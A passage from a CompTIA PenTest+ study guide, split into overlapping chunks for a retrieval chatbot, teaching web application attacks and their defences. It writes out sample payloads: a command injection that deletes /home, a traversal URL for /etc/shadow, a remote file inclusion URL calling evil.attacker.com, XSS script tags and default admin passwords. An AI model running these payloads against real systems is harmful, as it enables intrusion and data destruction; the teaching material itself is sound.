simple application shown in Figure 9.5. FIGURE 9.5 Account creation page This application sets up a new student account for a course. Among other actions, it creates a directory on the server for the student. On a Linux system, the application might use a system() call to send the directory creation command to the underlying operating system. For example, if someone fills in the text box with: mchapple the application might use the function call: system('mkdir /home/students/mchapple') to create a home directory for that user. An attacker examining this application might guess that this is how the application works and then supply the input: mchapple & rm -rf /home which the application then uses to create the system call: system('mkdir /home/students/mchapple & rm -rf /home') This sequence of commands deletes the /home directory along with all
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	a Linux system, the application might use a system() call to send the directory creation command to the underlying operating system. For example, if someone fills in the text box with: mchapple the application might use the function call: system('mkdir /home/students/mchapple') to create a home directory for that user. An attacker examining this application might guess that this is how the application works and then supply the input: mchapple & rm -rf /home which the application then uses to create the system call: system('mkdir /home/students/mchapple & rm -rf /home') This sequence of commands deletes the /home directory along with all files and subfolders it contains. The ampersand in this command indicates that the operating system should execute the text after the ampersand as a separate command. This allows the attacker to execute the rm command by exploiting an input field that is only intended to execute a mkdir command. LDAP Injection Attacks The Lightweight Directory Access Protocol (LDAP) is a directory services protocol used by Microsoft Active Directory and other identity and access management systems. LDAP provides a query‐based interface to allow other services to obtain information from the LDAP database. This interface also exposes LDAP to injection attacks similar to the way that databases are vulnerable to SQL injection attacks. LDAP injection attacks attempt to insert additional code into LDAP queries with the goal of either allowing an attacker to retrieve unauthorized information from the organization's LDAP servers or to bypass authentication mechanisms. Fortunately, the same input validation and escaping techniques that protect against SQL injection attacks are also effective against LDAP injection attacks. Server‐Side Template Injection Server‐side template injection (SSTI) is a security vulnerability that arises when user input is embedded within templates and is not properly sanitized before being processed by the server. Templates are commonly used in web applications to generate dynamic HTML or other types of content by mixing static text with dynamic data. These templates are processed on the server side, and if the template engine interprets user input as code rather than just plain text, an attacker can inject malicious code into the template, leading to potentially severe consequences. Deserialization Attacks Deserialization is the process of converting a stream of bytes or data back into a corresponding object in a programming language. This is often used in web applications to save the state of an object or to transfer data between systems. While serialization allows an object to be converted into a format that can be easily stored or transmitted, deserialization reverses this process, rebuilding the object from the serialized data. The danger with deserialization lies in the fact that the deserialized data might contain malicious content. If an application deserializes data from an untrusted source without proper validation, an attacker can manipulate the serialized data to execute arbitrary code, alter program behavior, or perform other unauthorized actions on the server. This is particularly concerning in languages like Java, Python, and PHP, where deserialized objects can include executable code. To understand how deserialization
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	serialization allows an object to be converted into a format that can be easily stored or transmitted, deserialization reverses this process, rebuilding the object from the serialized data. The danger with deserialization lies in the fact that the deserialized data might contain malicious content. If an application deserializes data from an untrusted source without proper validation, an attacker can manipulate the serialized data to execute arbitrary code, alter program behavior, or perform other unauthorized actions on the server. This is particularly concerning in languages like Java, Python, and PHP, where deserialized objects can include executable code. To understand how deserialization attacks work, let's consider an example. Suppose you have a web application that allows users to save their session state (like shopping cart contents) between visits. The application might serialize this data and store it in a cookie or a server‐side database. When the user returns, the application deserializes the data to restore the session. If an attacker can intercept and modify the serialized data, they might be able to inject harmful objects into the data stream. Exploiting Authentication Vulnerabilities Applications, like servers and networks, rely on authentication mechanisms to confirm the identity of users and devices and verify that they are authorized to perform specific actions. Attackers and penetration testers alike often seek to undermine the security of those authentication systems because, if they are able to do so, they may gain illegitimate access to systems, services, and information protected by that authentication infrastructure. Password Authentication Passwords are the most common form of authentication in use today, but unfortunately, they are also the most easily defeated. The reason for this is that passwords are a knowledge‐based authentication technique. An attacker who learns a user's password may then impersonate the user from that point forward until the password expires or is changed. There are many ways that an attacker may learn a user's password, ranging from technical to social. Here are just a few of the possible ways that an attacker might discover a user's password: Using brute‐force techniques to systematically try every possible password combination until the correct one is found Conducting social engineering attacks that trick the user into revealing a password, either directly or through a false authentication mechanism Eavesdropping on unencrypted network traffic Obtaining a dump of passwords from previously compromised sites and assuming that a significant proportion of users reuse their passwords from that site on other sites Exploiting hash collisions to trick the system into accepting a password that generates the same hash as the correct one In addition to these approaches, attackers may be able to conduct credential brute‐forcing attacks, in which they obtain a word list of common passwords or a set of weakly hashed passwords from a target system and then conduct an exhaustive search to crack those passwords and obtain access to the system. We'll discuss password cracking techniques in greater detail in Chapter 10, “Exploiting Host Vulnerabilities.” In some cases, application developers, vendors, and system administrators make it easy
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	on other sites Exploiting hash collisions to trick the system into accepting a password that generates the same hash as the correct one In addition to these approaches, attackers may be able to conduct credential brute‐forcing attacks, in which they obtain a word list of common passwords or a set of weakly hashed passwords from a target system and then conduct an exhaustive search to crack those passwords and obtain access to the system. We'll discuss password cracking techniques in greater detail in Chapter 10, “Exploiting Host Vulnerabilities.” In some cases, application developers, vendors, and system administrators make it easy for an attacker. Systems often ship with default administrative accounts that may remain unchanged. For example, Figure 9.6 shows a section of the manual for a Zyxel router that includes a default username and password, as well as instructions for changing that password. FIGURE 9.6 Zyxel router default password Penetration testers may assume that an administrator may not have changed the default password and attempt to use a variety of default passwords on applications and devices to gain access. Some common username/password combinations to test are as follows: administrator/password admin/password admin/admin Many websites maintain detailed catalogs of the default passwords used for a wide range of applications and devices. Those sites are a great starting point for penetration testers seeking to gain access to a networked device. Session Hijacking Attacks Credential‐stealing attacks allow a hacker or penetration tester to authenticate directly to a service using a stolen account. Session hijacking attacks take a different approach by stealing an existing authenticated session. These attacks don't require that the attacker gain access to the authentication mechanism; instead, they take over an already authenticated session with a website. Most websites that require authentication manage user sessions using cookies managed in the user's browser. In this approach, illustrated in Figure 9.7, the user accesses the website's login form and uses their credentials to authenticate. If the user passes the authentication process, the website provides the user's browser with a cookie that may be used to authenticate future requests. Once the user has a valid cookie stored in the browser, the browser transmits that cookie with all future requests made to the website. The website inspects the cookie and determines that the user has already authenticated and does not need to reenter their password or complete other authentication tasks. FIGURE 9.7 Session authentication with cookies The cookie is simply a storage object maintained in the user's browser that holds variables that may later be accessed by the website that created them. You can think of a cookie as a small database of information that the website maintains in the user's browser. The cookie contains an authentication string that ties the cookie to a particular user session. Figure 9.8 shows an example of a cookie used by the CNN.com website, viewed in the Chrome browser. If you inspect the contents of your own browser's cookie cache, you'll likely find hundreds or thousands of cookies maintained by
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	The cookie is simply a storage object maintained in the user's browser that holds variables that may later be accessed by the website that created them. You can think of a cookie as a small database of information that the website maintains in the user's browser. The cookie contains an authentication string that ties the cookie to a particular user session. Figure 9.8 shows an example of a cookie used by the CNN.com website, viewed in the Chrome browser. If you inspect the contents of your own browser's cookie cache, you'll likely find hundreds or thousands of cookies maintained by websites that you've visited. These cookies may be stored on a computer for years and are vulnerable to being viewed, modified, or stolen by an attacker. FIGURE 9.8 Session cookie from CNN.com Session fixation attacks are a variant of session hijacking attacks that exploit applications that choose to reuse the same session ID across user sessions instead of expiring it after each session. In those cases, an attacker might obtain access to a user's account by following a series of steps: 1. Obtain an old session ID through some mechanism. In cases where the session ID is stored in an authentication cookie, the attacker might use malware to access the cookie on the user's device. In cases where the session ID is passed in a URL argument or hidden form field, the attacker might obtain it through eavesdropping or the theft of log files. 2. Force the user to authenticate to the website by popping up a window, sending a link, or other means. Importantly, the attacker does not need to be able to observe the authentication; they merely need to get the user to perform the authentication. This reactivates the old session ID. 3. Use the session ID to authenticate to the remote service, obtaining access to the user's account. Cookie Stealing and Manipulation As you've just read, cookies serve as keys to bypass the authentication mechanisms of websites. To draw a parallel, imagine attending a trade conference. When you arrive at the registration booth, you might be asked to provide photo identification and pay a registration fee. In this case, you go through an authentication process. After you register, the booth attendant hands you a badge that you wear around your neck for the remainder of the show. From that point forward, any security staff simply glance at your badge and know that you've already been authenticated and granted access to the show. If someone steals your badge, they now have the same show access that you enjoyed. Cookies work the same way. They're just digital versions of badges. If an attacker is able to steal someone's cookie, they may then impersonate that user to gain access to the website that issued the cookie. This reuse of an authentication credential is an example of a replay attack. There are several ways that an attacker might obtain a cookie: Eavesdropping on unencrypted network connections and stealing a copy of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	your badge and know that you've already been authenticated and granted access to the show. If someone steals your badge, they now have the same show access that you enjoyed. Cookies work the same way. They're just digital versions of badges. If an attacker is able to steal someone's cookie, they may then impersonate that user to gain access to the website that issued the cookie. This reuse of an authentication credential is an example of a replay attack. There are several ways that an attacker might obtain a cookie: Eavesdropping on unencrypted network connections and stealing a copy of the cookie as it is transmitted between the user and the website. This is made possible when the system is designed to use insecure data transmission techniques, such as unencrypted protocols. Installing malware on the user's browser that retrieves cookies and transmits them back to the attacker. Engaging in an on‐path attack, where the attacker fools the user into thinking that the attacker is actually the target website and presenting a fake authentication form. The attacker may then authenticate to the website on the user's behalf and obtain the cookie. Once the attacker has the cookie, they may perform cookie manipulation to alter the details sent back to the website or simply use the cookie as the badge required to gain access to the site, as shown in Figure 9.9. Online SSL/TLS Checkers Configuring web servers to properly implement Transport Layer Security (TLS) is a complex undertaking. Administrators must ensure that they have valid and trusted certificates, that the server supports only current versions of TLS, and that the server supports only strong cipher suites. Online SSL/TLS checking tools scan web servers and produce reports summarizing any potential issues. Qualys's SSL Labs (https://ssllabs.com) is one popular tool used for this purpose. It produces reports such as the one shown here. DigiCert's SSL Tools (https://www.digicert.com/tools) is a similar tool used for the same purpose. The following graphic provides an example of a DigiCert report. Web server administrators should use these tools regularly to monitor for TLS security issues. FIGURE 9.9 Session hijacking with cookies Unvalidated Redirects Insecure URL redirects are another vulnerability that attackers may exploit in an attempt to steal user sessions. Some web applications allow the browser to pass destination URLs to the application and then redirect the user to that URL at the completion of their transaction. For example, an ordering page might use URLs with this structure: https://www.mycompany.com/ordering.php? redirect=https%3a//www.mycompany.com/</line> <line xml:id="c09line-0026"> <![CDATA[thankyou.htm The web application would then send the user to the thank‐you page at the conclusion of the transaction. This approach is convenient for web developers because it allows administrators to modify the destination page without altering the application code. However, if the application allows redirection to any URL, this creates a situation known as an unvalidated redirect, which an attacker may use to redirect the user to a malicious site. For example, an attacker might post a link to the previous page on a message
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	example, an ordering page might use URLs with this structure: https://www.mycompany.com/ordering.php? redirect=https%3a//www.mycompany.com/</line> <line xml:id="c09line-0026"> <![CDATA[thankyou.htm The web application would then send the user to the thank‐you page at the conclusion of the transaction. This approach is convenient for web developers because it allows administrators to modify the destination page without altering the application code. However, if the application allows redirection to any URL, this creates a situation known as an unvalidated redirect, which an attacker may use to redirect the user to a malicious site. For example, an attacker might post a link to the previous page on a message board but alter the URL to appear as follows: https://www.mycompany.com/ordering.php? redirect=https%3a//www.evilhacker.com/ passwordstealer.htm A user visiting this link would complete the legitimate transaction on the mycompany.com website but then be redirected to the attacker's page, where code might send the user straight into a session‐stealing or credential theft attack. Developers seeking to include redirection options in their applications should perform validated redirects that check redirection URLs against an approved list. This list might specify the exact URLs authorized for redirection, or more simply, it might just limit redirection to URLs from the same domain. JWT Manipulation JSON web tokens (JWTs) are a popular method for securing web‐based authentication and authorization. They are used to transmit information between parties as a JSON object, and these tokens are digitally signed, typically using a secret key or a public/private key pair, ensuring the integrity and authenticity of the data. While JWTs are a powerful tool, they are also susceptible to several types of attacks if not properly implemented. These include: None Algorithm Vulnerability One of the most infamous JWT vulnerabilities occurs when the token's header specifies alg: none. Some JWT libraries fail to validate the signature properly when this algorithm is used, allowing an attacker to modify the token's payload and bypass authentication altogether. This attack relies on the application accepting unsigned JWTs as valid tokens. Weak Signing Key If a JWT is signed using a weak secret key, an attacker can use brute‐ force methods to guess the key. Once the key is known, the attacker can forge tokens, granting themselves unauthorized access or escalating privileges within the application. Algorithm Confusion Attack JWTs support various signing algorithms, including symmetric (e.g., HMAC) and asymmetric (e.g., RSA) algorithms. An attacker might change the algorithm in the header from RS256 (which requires a private key) to HS256 (which uses a shared secret). If the application uses the public key as the HMAC secret, an attacker could sign tokens with the server's public key and pass them off as valid, bypassing authentication. Expired Tokens JWTs often include an exp (expiration) claim, specifying when the token expires. If the application does not properly enforce token expiration, an attacker could use an old, expired token to access the application long after they should no longer have access. Kerberos Exploits Kerberos is a commonly used centralized authentication protocol that is designed to operate on untrusted networks by leveraging encryption. Kerberos
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	HS256 (which uses a shared secret). If the application uses the public key as the HMAC secret, an attacker could sign tokens with the server's public key and pass them off as valid, bypassing authentication. Expired Tokens JWTs often include an exp (expiration) claim, specifying when the token expires. If the application does not properly enforce token expiration, an attacker could use an old, expired token to access the application long after they should no longer have access. Kerberos Exploits Kerberos is a commonly used centralized authentication protocol that is designed to operate on untrusted networks by leveraging encryption. Kerberos uses the authentication process shown in Figure 9.10. Users authenticate to an authentication server (AS) and initially obtain a ticket granting ticket (TGT). They then use the TGT to obtain server tickets from the authentication server that they may use to prove their identity to an individual service. Kerberos relies on a central key distribution center (KDC). Compromise of the KDC would allow an attacker to impersonate any user. Kerberos attacks have received significant attention over the past few years, as local attacks against compromised KDCs have resulted in complete compromise of Kerberos‐authenticated systems. Common Kerberos attacks include the following: Administrator account attacks, in which an attacker compromises an administrator account and uses it to manipulate the KDC. Kerberos ticket reuse, including pass‐the‐ticket attacks, which allow impersonation of legitimate users for the life span of the ticket, and pass‐the‐key attacks, which reuse a secret key to acquire tickets. Ticket granting ticket (TGT)‐focused attacks. TGTs are incredibly valuable and can be created with extended life spans. When attackers succeed in acquiring TGTs, they often call them “golden tickets” because they allow complete access to Kerberos‐connected systems, including creation of new tickets, account changes, and even falsification of accounts or services. FIGURE 9.10 Kerberos authentication process Exploiting Authorization Vulnerabilities We've explored injection vulnerabilities that allow an attacker to send code to backend systems and authentication vulnerabilities that allow an attacker to assume the identity of a legitimate user. Let's now take a look at some authorization vulnerabilities that allow an attacker to exceed the level of access for which they are authorized. Insecure Direct Object References In some cases, web developers design an application to directly retrieve information from a database based on an argument provided by the user in either a query string or a POST request. For example, this query string might be used to retrieve a document from a document management system: https://www.mycompany.com/getDocument.php?documentID=1842 There is nothing wrong with this approach, as long as the application also implements other authorization mechanisms. The application is still responsible for ensuring that the user is properly authenticated and is authorized to access the requested document. The reason for this is that an attacker can easily view this URL and then modify it to attempt to retrieve other documents, such as in these examples: https://www.mycompany.com/getDocument.php?documentID=1841 https://www.mycompany.com/getDocument.php?documentID=1843 https://www.mycompany.com/getDocument.php?documentID=1844 If the application does not perform authorization checks, the user may be permitted to view information that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	string might be used to retrieve a document from a document management system: https://www.mycompany.com/getDocument.php?documentID=1842 There is nothing wrong with this approach, as long as the application also implements other authorization mechanisms. The application is still responsible for ensuring that the user is properly authenticated and is authorized to access the requested document. The reason for this is that an attacker can easily view this URL and then modify it to attempt to retrieve other documents, such as in these examples: https://www.mycompany.com/getDocument.php?documentID=1841 https://www.mycompany.com/getDocument.php?documentID=1843 https://www.mycompany.com/getDocument.php?documentID=1844 If the application does not perform authorization checks, the user may be permitted to view information that exceeds their authority. This situation is known as an insecure direct object reference. Canadian Teenager Arrested for Exploiting Insecure Direct Object Reference In April 2018, Nova Scotia authorities charged a 19‐year‐old with “unauthorized use of a computer” when he discovered that the website used by the province for handling Freedom of Information requests had URLs that contained a simple integer corresponding to the request ID. After noticing this, the teenager simply altered the ID from a URL that he received after filing his own request and viewed the requests made by other individuals. That's not exactly a sophisticated attack, and many cybersecurity professionals (your authors included) would not even consider it a hacking attempt. Eventually, the authorities recognized that the province IT team was at fault and dropped the charges against the teenager. Directory Traversal Some web servers suffer from a security misconfiguration that allows users to navigate the directory structure and access files that should remain secure. These directory traversal attacks work when web servers allow the inclusion of operators that navigate directory paths, and filesystem access controls don't properly restrict access to files stored elsewhere on the server. For example, consider an Apache web server that stores web content in the directory path /var/www/html/. That same server might store the shadow password file, which contains hashed user passwords, in the /etc directory using the filename /etc/shadow. Both of these locations are linked through the same directory structure, as shown in Figure 9.11. FIGURE 9.11 Example web server directory structure If the Apache server uses /var/www/html/ as the root location for the website, this is the assumed path for all files unless otherwise specified. For example, if the site were www.mycompany.com, the URL www.mycompany.com/account.php would refer to the file /var/www/html/account.php stored on the server. In Linux operating systems, the .. operator in a file path refers to the directory one level higher than the current directory. For example, the path /var/www/html/../ refers to the directory that is one level higher than the html directory, or /var/www/. Directory traversal attacks use this knowledge and attempt to navigate outside of the areas of the filesystem that are reserved for the web server. For example, a directory traversal attack might seek to access the shadow password file by entering this URL: http://www.mycompany.com/../../../etc/shadow If the attack is successful, the web server will dutifully display the shadow password file in the attacker's browser, providing
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	.. operator in a file path refers to the directory one level higher than the current directory. For example, the path /var/www/html/../ refers to the directory that is one level higher than the html directory, or /var/www/. Directory traversal attacks use this knowledge and attempt to navigate outside of the areas of the filesystem that are reserved for the web server. For example, a directory traversal attack might seek to access the shadow password file by entering this URL: http://www.mycompany.com/../../../etc/shadow If the attack is successful, the web server will dutifully display the shadow password file in the attacker's browser, providing a starting point for a brute‐force attack on the credentials. The attack URL uses the .. operator three times to navigate up through the directory hierarchy. If you refer back to Figure 9.11 and use the /var/www/html directory as your starting point, the first .. operator brings you to /var/www, the second brings you to /var, and the third brings you to the root directory, /. The remainder of the URL brings you down into the /etc/ directory and to the location of the /etc/shadow file. Penetration testers may also look for common paths on web servers to identify hidden applications. For example, they might check for URLs like these: http://www.mycompany.com/admin http://www.mycompany.com/inside http://www.mycompany.com/employees http://www.mycompany.com/portal with the hope of stumbling across resources that were not intended for public consumption but were not properly secured. The DirBuster tool, shown in Figure 9.12, automates this process by scanning a web server for thousands of common URLs. FIGURE 9.12 Directory scanning with DirBuster File Inclusion File inclusion attacks take directory traversal to the next level. Instead of simply retrieving a file from the local operating system and displaying it to the attacker, file inclusion attacks actually execute the code contained within a file, allowing the attacker to fool the web server into executing arbitrary code. File inclusion attacks come in two variants: Local file inclusion attacks seek to execute code stored in a file located elsewhere on the web server. They work in a manner very similar to a directory traversal attack. For example, an attacker might use the following URL to execute a file named attack.exe that is stored in the C:\www\uploads directory on a Windows server: http://www.mycompany.com/app.php? include=C:\\www\\uploads\\attack.exe Remote file inclusion attacks allow the attacker to go a step further and execute code that is stored on a remote server. These attacks are especially dangerous because the attacker can directly control the code being executed without having to first store a file on the local server. For example, an attacker might use this URL to execute an attack file stored on a remote server: http://www.mycompany.com/app.php? include=http://evil.attacker.com/ attack.exe When attackers discover a file inclusion vulnerability, they often exploit it to upload a web shell to the server. Web shells allow the attacker to execute commands on the server and view the results in the browser. This approach provides the attacker with access to the server over commonly used HTTP and HTTPS ports, making
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	are especially dangerous because the attacker can directly control the code being executed without having to first store a file on the local server. For example, an attacker might use this URL to execute an attack file stored on a remote server: http://www.mycompany.com/app.php? include=http://evil.attacker.com/ attack.exe When attackers discover a file inclusion vulnerability, they often exploit it to upload a web shell to the server. Web shells allow the attacker to execute commands on the server and view the results in the browser. This approach provides the attacker with access to the server over commonly used HTTP and HTTPS ports, making their traffic less vulnerable to detection by security tools. In addition, the attacker may even repair the initial vulnerability they used to gain access to the server to prevent its discovery by another attacker seeking to take control of the server or by a security team who then might be tipped off to the successful attack. Arbitrary Code Execution Arbitrary code execution is a critical security vulnerability that occurs when an attacker can execute commands or run code of their choice on a target system. This capability often arises due to flaws in software or web applications, such as those found in file inclusion, buffer overflows, or command injection vulnerabilities. The consequences of arbitrary code execution can be severe, allowing attackers to install malware, exfiltrate data, or take full control of the compromised system. Here are some examples of ways that common attack types may be used to cause arbitrary code execution: File Inclusion Attacks: In local or remote file inclusion attacks, an attacker tricks the web server into including and executing a file that contains malicious code. This file could be located on the server itself or on a remote system controlled by the attacker. Once the server processes the malicious file, it executes the code within, giving the attacker the ability to perform unauthorized actions on the server. Buffer Overflow Vulnerabilities: In a buffer overflow attack, an attacker sends more data to a program than it can handle, causing the program to overwrite parts of its memory. If the attacker carefully crafts this data, they can overwrite memory locations with malicious code, which the program then executes. This type of arbitrary code execution can result in complete system compromise. Command Injection: When an application improperly processes user input and allows that input to be executed as a system command, attackers can inject their own commands into the input, which the system will then run. This is particularly dangerous because it can allow an attacker to perform any action that the application itself is capable of, often including actions at an elevated privilege level. Privilege Escalation We discussed privilege escalation attacks in Chapter 5. In that discussion, we referenced these attacks in the context of operating system vulnerabilities. Privilege escalation attacks are also possible against applications. In those cases, the attacker first gains access to the application account belonging to a standard user and then uses one or more
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	command, attackers can inject their own commands into the input, which the system will then run. This is particularly dangerous because it can allow an attacker to perform any action that the application itself is capable of, often including actions at an elevated privilege level. Privilege Escalation We discussed privilege escalation attacks in Chapter 5. In that discussion, we referenced these attacks in the context of operating system vulnerabilities. Privilege escalation attacks are also possible against applications. In those cases, the attacker first gains access to the application account belonging to a standard user and then uses one or more exploits to gain administrative privileges with that account. Exploiting Web Application Vulnerabilities Web applications are complex ecosystems consisting of application code, web platforms, operating systems, databases, and interconnected application programming interfaces (APIs). The complexity of these environments makes many different types of attack possible and provides fertile ground for penetration testers. We've already looked at a variety of attacks against web applications, including injection attacks, session hijacking, directory traversal, and more. In the following sections, we round out our look at web‐based exploits by exploring cross‐site scripting, cross‐ site request forgery, and clickjacking. Cross‐Site Scripting (XSS) Cross‐site scripting (XSS) attacks occur when web applications allow an attacker to perform HTML injection, inserting their own HTML code into a web page. Reflected XSS XSS attacks commonly occur when an application allows reflected input. For example, consider a simple web application that contains a single text box asking a user to enter their name. When the user clicks Submit, the web application loads a new page that says, “Hello, name.” Under normal circumstances, this web application functions as designed. However, a malicious individual could take advantage of this web application to trick an unsuspecting third party. As you may know, you can embed scripts in web pages by using the HTML tags <SCRIPT> and </SCRIPT>. Suppose that, instead of entering Mike in the Name field, you enter the following text: Mike<SCRIPT>alert('hello')</SCRIPT> When the web application “reflects” this input in the form of a web page, your browser processes it as it would any other web page; it displays the text portions of the web page and executes the script portions. In this case, the script simply opens a pop‐up window that says “hello” in it. However, you could be more malicious and include a more sophisticated script that asks the user to provide a password and transmits it to a malicious third party. At this point, you're probably asking yourself how anyone would fall victim to this type of attack. After all, you're not going to attack yourself by embedding scripts in the input that you provide to a web application that performs reflection. The key to this attack is that it's possible to embed form input in a link. A malicious individual could create a web page with a link titled “Check your account at First Bank” and encode form input in the link. When the user visits the link, the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	provide a password and transmits it to a malicious third party. At this point, you're probably asking yourself how anyone would fall victim to this type of attack. After all, you're not going to attack yourself by embedding scripts in the input that you provide to a web application that performs reflection. The key to this attack is that it's possible to embed form input in a link. A malicious individual could create a web page with a link titled “Check your account at First Bank” and encode form input in the link. When the user visits the link, the web page appears to be an authentic First Bank website (because it is!) with the proper address in the toolbar and a valid digital certificate. However, the website would then execute the script included in the input by the malicious user, which appears to be part of the valid web page. What's the answer to cross‐site scripting? When creating web applications that allow any type of user input, developers must be sure to perform input validation. At the most basic level, applications should never allow a user to include the <SCRIPT> tag in a reflected input field. However, this doesn't solve the problem completely; there are many clever alternatives available to an industrious web application attacker. The best solution is to determine the type of input that the application will allow and then validate the input to ensure that it matches that pattern. For example, if an application has a text box that allows users to enter their age, it should accept only one to three digits as input. The application should reject any other input as invalid. For more examples of ways to evade cross‐site scripting filters, see https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Ch eat_Sheet.html. Stored/Persistent XSS Cross‐site scripting attacks often exploit reflected input, but this isn't the only way that the attacks might take place. Another common technique is to store cross‐site scripting code on a remote web server in an approach known as stored XSS. These attacks are described as persistent, because they remain on the server even when the attacker isn't actively waging an attack. As an example, consider a message board that allows users to post messages that contain HTML code. This is very common, because users may want to use HTML to add emphasis to their posts. For example, a user might use this HTML code in a message board posting: <p>Hello everyone,</p> <p>I am planning an upcoming trip to <A HREF= 'https://www.mlb.com/mets/ballpark'>Citi Field to see the Mets take on the Yankees in the Subway Series.</p> <p>Does anyone have suggestions for transportation? I am staying in Manhattan and am only interested in <B>public transportation</B> options. </p> <p>Thanks!</p> <p>Mike</p> When displayed in a browser, the HTML tags would alter the appearance of the message, as shown in Figure 9.13. FIGURE 9.13 Message board post rendered in a browser An attacker seeking to conduct a cross‐site scripting attack could try to insert an HTML script in this code. For example, they
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	board posting: <p>Hello everyone,</p> <p>I am planning an upcoming trip to <A HREF= 'https://www.mlb.com/mets/ballpark'>Citi Field to see the Mets take on the Yankees in the Subway Series.</p> <p>Does anyone have suggestions for transportation? I am staying in Manhattan and am only interested in <B>public transportation</B> options. </p> <p>Thanks!</p> <p>Mike</p> When displayed in a browser, the HTML tags would alter the appearance of the message, as shown in Figure 9.13. FIGURE 9.13 Message board post rendered in a browser An attacker seeking to conduct a cross‐site scripting attack could try to insert an HTML script in this code. For example, they might enter this code: <p>Hello everyone,</p> <p>I am planning an upcoming trip to <A HREF= 'https://www.mlb.com/mets/ballpark'>Citi Field to see the Mets take on the Yankees in the Subway Series.</p> <p>Does anyone have suggestions for transportation? I am staying in Manhattan and am only interested in public transportation options.</p> <p>Thanks!</p> <p>Mike</p> <SCRIPT>alert('Cross-site scripting!')</SCRIPT> When future users load this message, they would see the alert pop‐up shown in Figure 9.14. This is fairly innocuous, but an XSS attack could also be used to redirect users to a phishing site, request sensitive information, or perform another attack. FIGURE 9.14 XSS attack rendered in a browser The Domain Object Model (DOM) You won't always find evidence of XSS attacks in the HTML sent from a web server. Some variations of XSS attacks hide the attack code within the Document Object Model (DOM). The DOM is a tool used by developers to manipulate web pages as objects. XSS attackers can hide the attack within the DOM and then call a DOM method within the HTML code that retrieves the XSS attack. These DOM‐based XSS attacks may escape scrutiny by security tools. While we're on the subject of the DOM, developers should also avoid including sensitive information in the DOM through the use of hidden elements. Assume that any information sent to a user is accessible to that user. Request Forgery Request forgery attacks exploit trust relationships and attempt to have users unwittingly execute commands against a remote server. They come in two forms: cross‐site request forgery and server‐side request forgery. Cross‐Site Request Forgery (CSRF/XSRF) Cross‐site request forgery attacks, abbreviated as XSRF or CSRF attacks, are similar to cross‐site scripting attacks but exploit a different trust relationship. XSS attacks exploit the trust that a user has in a website to execute code on the user's computer. XSRF attacks exploit the trust that remote sites have in a user's system to execute commands on the user's behalf. XSRF attacks work by making the reasonable assumption that users are often logged into many different websites at the same time. Attackers then embed code in one website that sends a command to a second website. When the user clicks the link on the first site, they are unknowingly sending a command to the second site. If the user happens to be logged into that second site, the command may succeed. Consider, for example, an online banking site. An attacker
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	XSRF attacks exploit the trust that remote sites have in a user's system to execute commands on the user's behalf. XSRF attacks work by making the reasonable assumption that users are often logged into many different websites at the same time. Attackers then embed code in one website that sends a command to a second website. When the user clicks the link on the first site, they are unknowingly sending a command to the second site. If the user happens to be logged into that second site, the command may succeed. Consider, for example, an online banking site. An attacker who wants to steal funds from user accounts might go to an online forum and post a message containing a link. That link actually goes directly into the money transfer site that issues a command to transfer funds to the attacker's account. The attacker then leaves the link posted on the forum and waits for an unsuspecting user to come along and click the link. If the user happens to be logged into the banking site, the transfer succeeds. Developers should protect their web applications against XSRF attacks. One way to do this is to create web applications that use secure tokens that the attacker would not know to embed in the links. Another safeguard is for sites to check the referring URL in requests received from end users and only accept requests that originated from their own site. Server‐Side Request Forgery (SSRF) Server‐side request forgery (SSRF) attacks exploit a similar vulnerability, but instead of tricking a user's browser into visiting a URL, they trick a server into visiting a URL based on user‐supplied input. SSRF attacks are possible when a web application accepts URLs from a user as input and then retrieves information from those URLs. If the server has access to non‐ public URLs, an SSRF attack can unintentionally disclose that information to an attacker. Clickjacking Clickjacking attacks use design elements of a web page to fool users into inadvertently clicking links that perform malicious actions. For example, a clickjacking attack might display an advertisement over a link that modifies browser security settings. The user innocently clicks the ad and inadvertently modifies the system security settings, allowing the attacker to gain control of the system. Unsecure Coding Practices We've now examined web application vulnerabilities extensively from the perspective of an attacker. There are, indeed, many ways that an attacker can exploit security flaws to compromise the security of applications. Now let's flip our perspective and look at some of the unsecure code practices that developers might engage in, inadvertently undermining application security. Source Code Comments Comments are an important part of any good developer's workflow. Placed strategically throughout code, they provide documentation of design choices, explain workflows, and offer details crucial to other developers who may later be called on to modify or troubleshoot the code. When placed in the right hands, comments are crucial. However, comments can also provide attackers with a road map explaining how code
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attacker can exploit security flaws to compromise the security of applications. Now let's flip our perspective and look at some of the unsecure code practices that developers might engage in, inadvertently undermining application security. Source Code Comments Comments are an important part of any good developer's workflow. Placed strategically throughout code, they provide documentation of design choices, explain workflows, and offer details crucial to other developers who may later be called on to modify or troubleshoot the code. When placed in the right hands, comments are crucial. However, comments can also provide attackers with a road map explaining how code works. In some cases, comments may even include critical security details that should remain secret. Developers should take steps to ensure that commented versions of their code remain secret. In the case of compiled code, this is unnecessary, as the compiler automatically removes comments from executable files. However, web applications that expose their code may allow remote users to view comments left in the code. In those environments, developers should remove comments from production versions of the code before deployment. It's fine to leave the comments in place for archived source code as a reference for future developers—just don't leave them accessible to unknown individuals on the Internet! Error Handling Attackers thrive on exploiting errors in code. Developers must understand this and write their code so that it is resilient to unexpected situations that an attacker might create in order to test the boundaries of code. For example, if a web form requests an age as input, it's insufficient to simply verify that the age is an integer. Attackers might enter a 50,000‐digit integer in that field in an attempt to perform an integer overflow attack. Developers must anticipate unexpected situations and write error handling code that steps in and handles these situations in a secure fashion. The lack of error handling routines may expose code to unacceptable levels of risk. If you're wondering why you need to worry about error handling when you already perform 